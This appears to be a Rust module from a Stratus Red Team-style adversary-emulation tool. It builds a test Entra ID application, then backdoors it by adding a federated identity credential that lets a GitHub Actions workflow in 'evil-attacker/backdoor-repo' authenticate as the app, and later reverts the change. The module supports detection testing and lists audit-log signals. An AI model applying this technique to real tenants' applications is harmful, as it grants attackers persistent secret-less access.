use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    azuread = { source = "hashicorp/azuread", version = "~> 2.0" }
    random  = { source = "hashicorp/random",  version = "~> 3.0" }
  }
}

provider "azuread" {}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "azuread_application" "app" {
  display_name = "stratus-red-team-fic-${random_string.suffix.result}"
}

output "app_object_id" { value = azuread_application.app.object_id }
"#;

async fn graph_token() -> Result<String> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;
    let url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id.as_str()),
        ("client_secret", client_secret.as_str()),
        ("scope", "https://graph.microsoft.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let app_id = outputs
        .get("app_object_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: app_object_id"))?;

    let url = format!(
        "https://graph.microsoft.com/v1.0/applications/{}/federatedIdentityCredentials",
        app_id
    );

    let body = serde_json::json!({
        "name": "stratus-red-team-backdoor-fic",
        "issuer": "https://token.actions.githubusercontent.com",
        "subject": "repo:evil-attacker/backdoor-repo:ref:refs/heads/main",
        "description": "Stratus Red Team backdoor federated identity credential",
        "audiences": ["api://AzureADTokenExchange"]
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 201 {
        let data: serde_json::Value = resp.json().await?;
        let fic_id = data["id"].as_str().unwrap_or("unknown");
        println!(
            "Added federated identity credential (id: {}) to application '{}' — \
             attacker GitHub Actions workflow can now authenticate as this application without a secret",
            fic_id, app_id
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to add federated identity credential ({}): {}",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let app_id = outputs
        .get("app_object_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: app_object_id"))?;

    // List FICs to find the one we created
    let list_url = format!(
        "https://graph.microsoft.com/v1.0/applications/{}/federatedIdentityCredentials",
        app_id
    );
    let list_resp: serde_json::Value = http
        .get(&list_url)
        .bearer_auth(&token)
        .send()
        .await?
        .json()
        .await?;

    let fics = list_resp["value"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("No value in FIC list response"))?;

    for fic in fics {
        let name = fic["name"].as_str().unwrap_or("");
        if name == "stratus-red-team-backdoor-fic" {
            let fic_id = fic["id"].as_str().unwrap_or("");
            let del_url = format!(
                "https://graph.microsoft.com/v1.0/applications/{}/federatedIdentityCredentials/{}",
                app_id, fic_id
            );
            let del_resp = http.delete(&del_url).bearer_auth(&token).send().await?;
            if del_resp.status().is_success() || del_resp.status().as_u16() == 204 {
                println!("Deleted federated identity credential '{}' from application '{}'", fic_id, app_id);
            }
        }
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "entra-id.persistence.backdoor-application-fic",
        friendly_name: "Backdoor Entra ID Application with Federated Identity Credential",
        description: "Adds a federated identity credential to an Entra ID application, allowing an external OIDC provider (GitHub Actions) to authenticate as the application without a client secret.",
        detection: "Entra ID audit log: Add federated identity credential. Microsoft Sentinel: Application FIC added alert.",
        platform: Platform::EntraId,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
